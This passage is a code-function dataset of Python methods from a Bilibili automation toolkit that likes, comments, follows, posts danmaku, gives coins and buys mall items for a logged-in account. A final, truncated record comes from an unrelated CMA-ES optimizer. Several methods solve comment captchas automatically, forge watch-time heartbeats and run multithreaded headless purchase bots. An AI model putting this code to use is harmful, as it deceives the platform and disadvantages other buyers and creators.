"Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n", "func_signal": "def share(self, aid):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/web-interface/share/add\"\npayload = {\n    'aid': aid,\n    'jsonp': \"jsonp\",\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"av{aid}\u5206\u4eab\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"av{aid}\u5206\u4eab\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# otype = \u4f5c\u54c1\u7c7b\u578b\n# oid = \u4f5c\u54c1ID\n# message = \u8bc4\u8bba\u5185\u5bb9\n", "func_signal": "def comment_post(self, otype, oid, message):\n", "code": "if Bilibili.patterns.get(otype) is None:\n    return False\nurl = f\"{self.protocol}://api.bilibili.com/x/v2/reply/add\"\nwhile True:\n    payload = {\n        'oid': oid,\n        'type': Bilibili.patterns[otype]['id'],\n        'message': message,\n        'plat': 1,\n        'jsonp': \"jsonp\",\n        'csrf': self.get_csrf(),\n    }\n    headers = {\n        'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\",\n        'Host': \"api.bilibili.com\",\n        'Origin': \"https://www.bilibili.com\",\n        'Referer': f\"{Bilibili.patterns[otype]['prefix']}{oid}\",\n    }\n    response = self._requests(\"post\", url, data=payload, headers=headers)\n    if response and response.get(\"code\") is not None:\n        if response['code'] == 0:\n            self._log(f\"\u4f5c\u54c1{oid}\u63d0\u4ea4\u8bc4\u8bba\\\"{message}\\\"\u6210\u529f\")\n            return True\n        elif response['code'] == 12015:\n            response = self._requests(\"get\", response['data']['url'], headers=headers, decode_level=1)\n            captcha = self._solve_captcha(response)\n            if captcha:\n                self._log(f\"\u8bc4\u8bba\u9a8c\u8bc1\u7801\u8bc6\u522b\u7ed3\u679c: {captcha}\")\n                payload['code'] = captcha\n            else:\n                self._log(f\"\u8bc4\u8bba\u9a8c\u8bc1\u7801\u8bc6\u522b\u670d\u52a1\u6682\u65f6\u4e0d\u53ef\u7528, 1\u5206\u949f\u540e\u91cd\u8bd5\")\n                time.sleep(60)\n        elif response['code'] == 12035:\n            self._log(f\"\u4f5c\u54c1{oid}\u63d0\u4ea4\u8bc4\u8bba\\\"{message}\\\"\u5931\u8d25, \u8be5\u8d26\u53f7\u88abUP\u4e3b\u5217\u5165\u8bc4\u8bba\u9ed1\u540d\u5355\")\n            return False\n        elif response['code'] == -105:\n            if \"code\" in payload:\n                payload.pop(\"code\")\n        else:\n            self._log(f\"\u4f5c\u54c1{oid}\u63d0\u4ea4\u8bc4\u8bba\\\"{message}\\\"\u5931\u8d25 {response}\")\n            return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n", "func_signal": "def like(self, aid):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/web-interface/archive/like\"\npayload = {\n    'aid': aid,\n    'like': 1,\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"av{aid}\u70b9\u8d5e\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"av{aid}\u70b9\u8d5e\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# mid = \u88ab\u5173\u6ce8\u7528\u6237UID\n# secret = \u6084\u6084\u5173\u6ce8\n", "func_signal": "def follow(self, mid, secret=False):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/relation/modify\"\npayload = {\n    'fid': mid,\n    'act': 3 if secret else 1,\n    're_src': 11,\n    'jsonp': \"jsonp\",\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://space.bilibili.com\",\n    'Referer': f\"https://space.bilibili.com/{mid}/\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"\u7528\u6237{mid}{'\u6084\u6084' if secret else ''}\u5173\u6ce8\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"\u7528\u6237{mid}{'\u6084\u6084' if secret else ''}\u5173\u6ce8\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# item_id = \u5546\u54c1ID\n# thread = \u7ebf\u7a0b\u6570\n# headless = \u9690\u85cf\u7a97\u53e3\n# timeout = \u8d85\u65f6\u5237\u65b0\n", "func_signal": "def mall_rush(self, item_id, thread=1, headless=True, timeout=10):\n", "code": "def executor(thread_id):\n    def find_and_click(class_name):\n        try:\n            element = driver.find_element_by_class_name(class_name)\n            element.click()\n        except:\n            element = None\n        return element\n\n    options = webdriver.ChromeOptions()\n    options.add_argument(\"log-level=3\")\n    if headless:\n        options.add_argument(\"headless\")\n    else:\n        options.add_argument(\"disable-infobars\")\n        options.add_argument(\"window-size=374,729\")\n    if platform.system() == \"Linux\":\n        options.add_argument(\"no-sandbox\")\n    options.add_experimental_option(\"mobileEmulation\", {'deviceName': \"Nexus 5\"})\n    if platform.system() == \"Windows\":\n        options.binary_location = \"chrome-win\\\\chrome.exe\"\n    driver = webdriver.Chrome(executable_path=\"chromedriver.exe\" if platform.system() == \"Windows\" else \"chromedriver\", options=options)\n    driver.get(f\"{self.protocol}://mall.bilibili.com/detail.html?itemsId={item_id}\")\n    for key, value in self.get_cookies().items():\n        driver.add_cookie({\n            'name': key,\n            'value': value,\n            'domain': \".bilibili.com\",\n        })\n    self._log(f\"(\u7ebf\u7a0b{thread_id})\u5546\u54c1{item_id}\u5f00\u59cb\u76d1\u89c6\u5e93\u5b58\")\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/items/info?itemsId={item_id}\"\n    while True:\n        response = self._requests(\"get\", url)\n        if response and response.get(\"code\") == 0 and response['data']['activityInfoVO']['serverTime'] >= response['data']['activityInfoVO']['startTime'] if response['data']['activityInfoVO'] else True:\n            break\n    timestamp = time.time()\n    in_stock = False\n    while True:\n        try:\n            result = {class_name: find_and_click(class_name) for class_name in [\"bottom-buy-button\", \"button\", \"dot\", \"pay-btn\", \"expire-time-format\", \"alert-ok\", \"error-button\"]}\n            if result['bottom-buy-button']:\n                if \"bottom-buy-disable\" not in result['bottom-buy-button'].get_attribute(\"class\"):\n                    if not in_stock:\n                        self._log(f\"(\u7ebf\u7a0b{thread_id})\u5546\u54c1{item_id}\u5df2\u5f00\u653e\u8d2d\u4e70\")\n                        in_stock = True\n                else:\n                    if in_stock:\n                        self._log(f\"(\u7ebf\u7a0b{thread_id})\u5546\u54c1{item_id}\u6682\u65e0\u6cd5\u8d2d\u4e70, \u539f\u56e0\u4e3a{result['bottom-buy-button'].text}\")\n                        in_stock = False\n                    driver.refresh()\n                    timestamp = time.time()\n            if result['pay-btn']:\n                timestamp = time.time()\n            if result['alert-ok']:\n                driver.refresh()\n            if result['expire-time-format']:\n                self._log(f\"(\u7ebf\u7a0b{thread_id})\u5546\u54c1{item_id}\u8ba2\u5355\u63d0\u4ea4\u6210\u529f, \u8bf7\u5728{result['expire-time-format'].text}\u5185\u5b8c\u6210\u652f\u4ed8\")\n                driver.quit()\n                return True\n            if time.time() - timestamp > timeout:\n                self._log(f\"(\u7ebf\u7a0b{thread_id})\u5546\u54c1{item_id}\u64cd\u4f5c\u8d85\u65f6, \u5f53\u524d\u9875\u9762\u4e3a{driver.current_url}\")\n                driver.get(f\"{self.protocol}://mall.bilibili.com/detail.html?itemsId={item_id}\")\n                timestamp = time.time()\n        except:\n            pass\n\nthreads = []\nfor i in range(thread):\n    threads.append(threading.Thread(target=executor, args=(i + 1,)))\nfor thread in threads:\n    thread.start()\nfor thread in threads:\n    thread.join()", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n# message = \u5f39\u5e55\u5185\u5bb9\n# page = \u5206P\n# moment = \u5f39\u5e55\u53d1\u9001\u65f6\u95f4\n", "func_signal": "def danmaku_post(self, aid, message, page=1, moment=-1):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/web-interface/view?aid={aid}\"\nresponse = self._requests(\"get\", url)\nif response and response.get(\"data\") is not None:\n    page_info = {page['page']: {\n        'cid': page['cid'],\n        'duration': page['duration'],\n    } for page in response['data']['pages']}\n    if page in page_info:\n        oid = page_info[page]['cid']\n        duration = page_info[page]['duration']\n    else:\n        self._log(f\"av{aid}\u4e0d\u5b58\u5728P{page}\")\n        return False\nelse:\n    self._log(f\"av{aid}\u4fe1\u606f\u89e3\u6790\u5931\u8d25\")\n    return False\nurl = f\"{self.protocol}://api.bilibili.com/x/v2/dm/post\"\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nwhile True:\n    payload = {\n        'type': 1,\n        'oid': oid,\n        'msg': message,\n        'aid': aid,\n        'progress': int(moment * 1E3) if moment != -1 else random.randint(0, duration * 1E3),\n        'color': 16777215,\n        'fontsize': 25,\n        'pool': 0,\n        'mode': 1,\n        'rnd': int(time.time() * 1E6),\n        'plat': 1,\n        'csrf': self.get_csrf(),\n    }\n    response = self._requests(\"post\", url, data=payload, headers=headers)\n    if response and response.get(\"code\") is not None:\n        if response['code'] == 0:\n            self._log(f\"av{aid}(P{page})\u5f39\u5e55\\\"{message}\\\"\u53d1\u9001\u6210\u529f\")\n            return True\n        elif response['code'] == 36703:\n            self._log(f\"av{aid}(P{page})\u5f39\u5e55\u53d1\u9001\u9891\u7387\u8fc7\u5feb, 10\u79d2\u540e\u91cd\u8bd5\")\n            time.sleep(10)\n        else:\n            self._log(f\"av{aid}(P{page})\u5f39\u5e55\\\"{message}\\\"\u53d1\u9001\u5931\u8d25 {response}\")\n            return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n# double = \u53cc\u500d\u6295\u5e01\n", "func_signal": "def reward(self, aid, double=True):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/web-interface/coin/add\"\npayload = {\n    'aid': aid,\n    'multiply': 2 if double else 1,\n    'cross_domain': \"true\",\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"av{aid}\u6295{2 if double else 1}\u679a\u786c\u5e01\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"av{aid}\u6295{2 if double else 1}\u679a\u786c\u5e01\u5931\u8d25 {response}\")\n    return self.reward(aid, False) if double else False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# app = APP\u901a\u9053\n# pc = PC\u901a\u9053\n", "func_signal": "def silver_to_coin(self, app=True, pc=False):\n", "code": "if app:\n    param = f\"access_key={self.access_token}&appkey={Bilibili.app_key}&ts={int(time.time())}\"\n    url = f\"{self.protocol}://api.live.bilibili.com/AppExchange/silver2coin?{param}&sign={self.calc_sign(param)}\"\n    response = self._requests(\"get\", url)\n    if response and response.get(\"code\") == 0:\n        self._log(\"\u94f6\u74dc\u5b50\u5151\u6362\u786c\u5e01(APP\u901a\u9053)\u6210\u529f\")\n    else:\n        self._log(f\"\u94f6\u74dc\u5b50\u5151\u6362\u786c\u5e01(APP\u901a\u9053)\u5931\u8d25 {response}\")\nif pc:\n    url = f\"{self.protocol}://api.live.bilibili.com/pay/v1/Exchange/silver2coin\"\n    payload = {\n        'platform': \"pc\",\n        'csrf_token': self.get_csrf(),\n    }\n    headers = {\n        'Host': \"api.live.bilibili.com\",\n        'Origin': \"https://live.bilibili.com\",\n        'Referer': \"https://live.bilibili.com/exchange\",\n    }\n    response = self._requests(\"post\", url, data=payload, headers=headers)\n    if response and response.get(\"code\") == 0:\n        self._log(\"\u94f6\u74dc\u5b50\u5151\u6362\u786c\u5e01(PC\u901a\u9053)\u6210\u529f\")\n    else:\n        self._log(f\"\u94f6\u74dc\u5b50\u5151\u6362\u786c\u5e01(PC\u901a\u9053)\u5931\u8d25 {response}\")", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# did = \u52a8\u6001ID\n# message = \u8f6c\u53d1\u5185\u5bb9\n# ats = \u88ab@\u7528\u6237UID\u5217\u8868\n", "func_signal": "def dynamic_repost(self, did, message=\"\u8f6c\u53d1\u52a8\u6001\", ats=[]):\n", "code": "def uid_to_nickname(mid):\n    url = f\"{self.protocol}://api.bilibili.com/x/web-interface/card?mid={mid}\"\n    response = self._requests(\"get\", url)\n    if response and response.get(\"code\") == 0:\n        return response['data']['card']['name']\n    else:\n        return \"\"\n\nurl = f\"{self.protocol}://api.vc.bilibili.com/dynamic_repost/v1/dynamic_repost/repost\"\nctrl = []\nfor at in zip(ats, [uid_to_nickname(mid) for mid in ats]):\n    ctrl.append({\n        'data': str(at[0]),\n        'location': len(message) + 1,\n        'length': len(at[1]) + 1,\n        'type': 1,\n    })\n    message = f\"{message} @{at[1]}\"\npayload = {\n    'uid': self.get_uid(),\n    'dynamic_id': did,\n    'content': message,\n    'at_uids': \",\".join([str(at) for at in ats]),\n    'ctrl': json.dumps(ctrl),\n    'csrf_token': self.get_csrf(),\n}\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded\",\n    'Host': \"api.vc.bilibili.com\",\n    'Origin': \"https://space.bilibili.com\",\n    'Referer': \"https://space.bilibili.com/208259/\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"\u52a8\u6001{did}\u8f6c\u53d1\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"\u52a8\u6001{did}\u8f6c\u53d1\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# status = \u4f18\u60e0\u5238\u72b6\u6001\n", "func_signal": "def mall_coupon_list(self, status=1):\n", "code": "status_map = {\n    1: \"validList\",\n    2: \"usedList\",\n    3: \"invalidList\",\n}\nif status not in status_map:\n    return []\nheaders = {\n    'Referer': \"https://mall.bilibili.com/couponlist.html?noTitleBar=1\",\n}\ncoupon_list = []\npage = 1\nwhile True:\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/coupon/list?status={status}&pageIndex={page}&pageSize=20\"\n    response = self._requests(\"get\", url, headers=headers)\n    if response and response.get(\"code\") == 0:\n        if response['data'][status_map[status]]:\n            for coupon in response['data'][status_map[status]]['list']:\n                coupon_list.append({\n                    'name': coupon['couponCodeName'],\n                    'description': coupon['couponDesc'],\n                    'detail': coupon['couponDetail'],\n                    'discount': coupon['couponDiscount'],\n                    'status': coupon['status'],\n                    'type': coupon['couponCodeType'],\n                    'start': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(coupon['useStartTime'] / 1E3)) if coupon['useStartTime'] else None,\n                    'end': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(coupon['useEndTime'] / 1E3)) if coupon['useEndTime'] else None,\n                    'use': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(coupon['useTime'] / 1E3)) if coupon['useTime'] else None,\n                    'expire': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(coupon['expireDate'] / 1E3)) if coupon['expireDate'] else None,\n                })\n            if response['data'][status_map[status]]['hasNextPage']:\n                page += 1\n                continue\n        self._log(f\"\u4f1a\u5458\u8d2d\u4f18\u60e0\u5238\u5217\u8868\u83b7\u53d6\u6210\u529f, \u603b\u8ba1{len(coupon_list)}\u5f20\u4f18\u60e0\u5238\")\n        for coupon in coupon_list:\n            self._log(f\"\u4f1a\u5458\u8d2d\u4f18\u60e0\u5238: {coupon['name']}\" + (f\", \u5931\u6548\u65f6\u95f4\u4e3a{coupon['expire']}\" if coupon['expire'] else f\", \u4f7f\u7528\u65f6\u95f4\u4e3a{coupon['use']}\" if coupon['use'] else f\", \u4f7f\u7528\u6709\u6548\u671f\u4e3a{coupon['start']}\u81f3{coupon['end']}\" if coupon['start'] and coupon['end'] else \"\"))\n        break\n    else:\n        self._log(f\"\u4f1a\u5458\u8d2d\u4f18\u60e0\u5238\u5217\u8868\u83b7\u53d6\u5931\u8d25 {response}\")\n        break\nself.__push_to_queue(\"mall_coupon_list\", coupon_list)\nreturn coupon_list", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# aid = \u7a3f\u4ef6av\u53f7\n", "func_signal": "def watch(self, aid):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/web-interface/view?aid={aid}\"\nresponse = self._requests(\"get\", url)\nif response and response.get(\"data\") is not None:\n    cid = response['data']['cid']\n    duration = response['data']['duration']\nelse:\n    self._log(f\"av{aid}\u4fe1\u606f\u89e3\u6790\u5931\u8d25\")\n    return False\nurl = f\"{self.protocol}://api.bilibili.com/x/report/click/h5\"\npayload = {\n    'aid': aid,\n    'cid': cid,\n    'part': 1,\n    'did': self.get_sid(),\n    'ftime': int(time.time()),\n    'jsonp': \"jsonp\",\n    'lv': None,\n    'mid': self.get_uid(),\n    'csrf': self.get_csrf(),\n    'stime': int(time.time()),\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"https://www.bilibili.com/video/av{aid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    url = f\"{self.protocol}://api.bilibili.com/x/report/web/heartbeat\"\n    payload = {\n        'aid': aid,\n        'cid': cid,\n        'jsonp': \"jsonp\",\n        'mid': self.get_uid(),\n        'csrf': self.get_csrf(),\n        'played_time': 0,\n        'pause': False,\n        'realtime': duration,\n        'dt': 7,\n        'play_type': 1,\n        'start_ts': int(time.time()),\n    }\n    response = self._requests(\"post\", url, data=payload, headers=headers)\n    if response and response.get(\"code\") == 0:\n        time.sleep(5)\n        payload['played_time'] = duration - 1\n        payload['play_type'] = 0\n        payload['start_ts'] = int(time.time())\n        response = self._requests(\"post\", url, data=payload, headers=headers)\n        if response and response.get(\"code\") == 0:\n            self._log(f\"av{aid}\u89c2\u770b\u6210\u529f\")\n            return True\nself._log(f\"av{aid}\u89c2\u770b\u5931\u8d25 {response}\")\nreturn False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# otype = \u4f5c\u54c1\u7c7b\u578b\n# oid = \u4f5c\u54c1ID\n# rpid = \u8bc4\u8bbaID\n", "func_signal": "def comment_like(self, otype, oid, rpid):\n", "code": "if Bilibili.patterns.get(otype) is None:\n    return False\nurl = f\"{self.protocol}://api.bilibili.com/x/v2/reply/action\"\npayload = {\n    'oid': oid,\n    'type': Bilibili.patterns[otype]['id'],\n    'rpid': rpid,\n    'action': 1,\n    'jsonp': \"jsonp\",\n    'csrf': self.get_csrf(),\n}\nheaders = {\n    'Content-Type': \"application/x-www-form-urlencoded; charset=UTF-8\",\n    'Host': \"api.bilibili.com\",\n    'Origin': \"https://www.bilibili.com\",\n    'Referer': f\"{Bilibili.patterns[otype]['prefix']}{oid}\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"\u8bc4\u8bba{rpid}\u70b9\u8d5e\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"\u8bc4\u8bba{rpid}\u70b9\u8d5e\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# status = \u5956\u54c1\u72b6\u6001\n# type = \u5956\u54c1\u7c7b\u578b\n", "func_signal": "def mall_prize_list(self, status=0, type=[1, 2]):\n", "code": "headers = {\n    'Referer': \"https://mall.bilibili.com/prizecenter.html\",\n}\nprize_list = []\npage = 1\nwhile True:\n    url = f\"{self.protocol}://mall.bilibili.com/mall-c/prize/list?pageNum={page}&pageSize=20&type={status}&v={int(time.time())}\"\n    response = self._requests(\"get\", url, headers=headers)\n    if response and response.get(\"code\") == 0:\n        for prize in response['data']['pageInfo']['list']:\n            if not type or prize['prizeType'] in type:\n                prize_list.append({\n                    'name': prize['prizeName'],\n                    'source': prize['sourceName'],\n                    'status': prize['status'],\n                    'type': prize['prizeType'],\n                    'expire': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(prize['expireTime'])),\n                })\n        if response['data']['pageInfo']['hasNextPage']:\n            page += 1\n        else:\n            self._log(f\"\u4f1a\u5458\u8d2d\u5956\u54c1\u5217\u8868\u83b7\u53d6\u6210\u529f, \u603b\u8ba1{len(prize_list)}\u4e2a\u5956\u54c1, {response['data']['waitDeliveryNum']}\u4e2a\u5956\u54c1\u5f85\u53d1\u8d27\")\n            for prize in prize_list:\n                self._log(f\"\u4f1a\u5458\u8d2d\u5956\u54c1: {prize['name']}, \u6765\u81ea{prize['source']}, \u9886\u53d6\u6709\u6548\u671f\u81f3{prize['expire']}\")\n            break\n    else:\n        self._log(f\"\u4f1a\u5458\u8d2d\u5956\u54c1\u5217\u8868\u83b7\u53d6\u5931\u8d25 {response}\")\n        break\nself.__push_to_queue(\"mall_prize_list\", prize_list)\nreturn prize_list", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "# mids = \u88ab\u5173\u6ce8\u7528\u6237UID\n", "func_signal": "def follow_batch(self, mids):\n", "code": "url = f\"{self.protocol}://api.bilibili.com/x/relation/batch/modify\"\npayload = {\n    'fids': \",\".join(map(str, mids)),\n    'act': 1,\n    'csrf': self.get_csrf(),\n    're_src': 222,\n}\nheaders = {\n    'Host': \"api.bilibili.com\",\n    'Referer': \"https://www.bilibili.com/blackboard/live/activity-NfUS01P8.html\",\n}\nresponse = self._requests(\"post\", url, data=payload, headers=headers)\nif response and response.get(\"code\") == 0:\n    self._log(f\"\u7528\u6237{', '.join(map(str, mids))}\u6279\u91cf\u5173\u6ce8\u6210\u529f\")\n    return True\nelse:\n    self._log(f\"\u7528\u6237{', '.join(map(str, mids))}\u6279\u91cf\u5173\u6ce8\u5931\u8d25 {response}\")\n    return False", "path": "Bilibili-Toolkit/bilibili.py", "commit_date": "2020-07-20 00:00:00", "repo_name": "Hsury/Bilibili-Toolkit", "stars": 1286, "license": "mit", "language": "python", "size": 491}
{"docstring": "\"\"\"see class `CMAEvolutionStrategy`\n\n\"\"\"\n", "func_signal": "def __init__(self, x0, sigma0, inopts = {}):\n", "code": "self.inputargs = dict(locals()) # for the record\ndel self.inputargs['self'] # otherwise the instance self has a cyclic reference\nself.inopts = inopts\nopts = Options(inopts).complement()  # Options() == fmin([],[]) == defaultOptions()\n\nif opts['noise_handling'] and eval(opts['noise_handling']):\n    raise ValueError('noise_handling not available with class CMAEvolutionStrategy, use function fmin')\nif opts['restarts'] and eval(opts['restarts']):\n    raise ValueError('restarts not available with class CMAEvolutionStrategy, use function fmin')\n\nif x0 == str(x0):\n    x0 = eval(x0)\nself.mean = array(x0)  # should not have column or row, is just 1-D\nif self.mean.ndim == 2:\n    print('WARNING: input x0 should be a list or 1-D array, trying to flatten ' +\n            str(self.mean.shape) + '-array')\n    if self.mean.shape[0] == 1:\n        self.mean = self.mean[0]\n    elif self.mean.shape[1] == 1:\n        self.mean = array([x[0] for x in self.mean])\nif self.mean.ndim != 1:\n    raise _Error('x0 must be 1-D array')\nif len(self.mean) <= 1:\n    raise _Error('optimization in 1-D is not supported (code was never tested)')\n\nself.N = self.mean.shape[0]\nN = self.N\nself.mean.resize(N) # 1-D array, not really necessary?!\nself.x0 = self.mean\nself.mean = self.x0.copy()  # goes to initialize\n\nself.sigma0 = sigma0\nif isinstance(sigma0, str):  # TODO: no real need here (do rather in fmin)\n    self.sigma0 = eval(sigma0)  # like '1./N' or 'np.random.rand(1)[0]+1e-2'\nif np.size(self.sigma0) != 1 or np.shape(self.sigma0):\n    raise _Error('input argument sigma0 must be (or evaluate to) a scalar')\nself.sigma = self.sigma0  # goes to inialize\n\n# extract/expand options\nopts.evalall(locals())  # using only N\nself.opts = opts\n\nself.randn = opts['randn']\nself.gp = GenoPheno(N, opts['scaling_of_variables'], opts['typical_x'],\n    opts['bounds'], opts['fixed_variables'], opts['transformation'])\nself.boundPenalty = BoundPenalty(self.gp.bounds)\ns = self.gp.geno(self.mean)\nself.mean = self.gp.geno(self.mean, bounds=self.gp.bounds)\nself.N = len(self.mean)\nN = self.N\nif (self.mean != s).any():\n    print('WARNING: initial solution is out of the domain boundaries:')\n    print('  x0   = ' + str(self.inputargs['x0']))\n    print('  ldom = ' + str(self.gp.bounds[0]))\n    print('  udom = ' + str(self.gp.bounds[1]))\nself.fmean = np.NaN             # TODO name should change? prints nan (OK with matlab&octave)\nself.fmean_noise_free = 0.  # for output only\n\nself.sp = CMAParameters(N, opts)\nself.sp0 = self.sp  # looks useless, as it is not a copy\n\n# initialization of state variables\nself.countiter = 0\nself.countevals = max((0, opts['verb_append'])) if type(opts['verb_append']) is not bool else 0\nself.ps = np.zeros(N)\nself.pc = np.zeros(N)\n\nstds = np.ones(N)\nself.sigma_vec = np.ones(N) if np.isfinite(self.sp.dampsvec) else 1\nif np.all(self.opts['CMA_teststds']):  # also 0 would not make sense\n    stds = self.opts['CMA_teststds']\n    if np.size(stds) != N:\n        raise _Error('CMA_teststds option must have dimension = ' + str(N))\nif self.opts['CMA_diagonal']:  # is True or > 0\n    # linear time and space complexity\n    self.B = array(1) # works fine with np.dot(self.B, anything) and self.B.T\n    self.C = stds**2  # TODO: remove this!?\n    self.dC = self.C\nelse:\n    self.B = np.eye(N) # identity(N), do not from matlib import *, as eye is a matrix there\n    # prevent equal eigenvals, a hack for np.linalg:\n    self.C = np.diag(stds**2 * exp(1e-6*(np.random.rand(N)-0.5)))\n    self.dC = np.diag(self.C)\n    self.Zneg = np.zeros((N, N))\nself.D = stds\n\nself.flgtelldone = True\nself.itereigenupdated = self.countiter\nself.noiseS = 0  # noise \"signal\"\nself.hsiglist = []\n\nif not opts['seed']:\n    np.random.seed()\n    six_decimals = (time.time() - 1e6 * (time.time() // 1e6))\n    opts['seed'] = 1e5 * np.random.rand() + six_decimals + 1e5 * (time.time() % 1)\nopts['seed'] = int(opts['seed'])\nnp.random.seed(opts['seed'])\n\nself.sent_solutions = SolutionDict()\nself.best = BestSolution()\n\nout = {}  # TODO: obsolete, replaced by method results()?\nout['best'] = self.best\n# out['hsigcount'] = 0\nout['termination'] = {}\nself.out = out\n\nself.const = BlancClass()\nself.const.chiN = N**0.5*(1-1./(4.*N)+1./(21.*N**2)) # expectation of norm(randn(N,1))\n\n# attribute for stopping criteria in function stop\nself.stopdict = CMAStopDict()\nself.callbackstop = 0\n\nself.fit = BlancClass()\nself.fit.fit = []   # not really necessary\nself.fit.hist = []  # short history of best\nself.fit.histbest = []   # long history of best\nself.fit.histmedian = [] # long history of median\n\nself.more_to_write = []  #[1, 1, 1, 1]  #  N*[1]  # needed when writing takes place before setting\n\n# say hello\nif opts['verb_disp'] > 0:\n    sweighted = '_w' if self.sp.mu > 1 else ''\n    smirr = 'mirr%d' % (self.sp.lam_mirr) if self.sp.lam_mirr else ''\n    print('(%d' % (self.sp.mu) + sweighted + ',%d' % (self.sp.popsize) + smirr + ')-CMA-ES' +\n          ' (mu_w=%2.1f,w_1=%d%%)' % (self.sp.mueff, int(100*self.sp.weights[0])) +\n          ' in dimension %d (seed=%d, %s)' 